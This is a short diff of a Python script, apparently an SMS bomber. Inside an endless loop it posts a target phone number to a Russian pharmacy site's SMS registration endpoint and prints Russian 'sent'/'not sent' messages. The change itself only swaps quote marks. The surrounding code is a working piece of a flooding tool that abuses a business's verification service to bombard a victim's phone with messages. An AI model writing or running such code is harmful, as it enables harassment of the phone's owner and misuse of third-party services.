@@ -338,7 +338,7 @@ while True:
 		print('[-] Не отправлено!')
 
 	try:
-		requests.post('https://apteka366.ru/login/register/sms/send', data={"phone": _phone})
+		requests.post("https://apteka366.ru/login/register/sms/send", data={"phone": _phone})
 		print('[+] apteka366 отправлено!')
 	except:
 		print('[-] Не отправлено!')
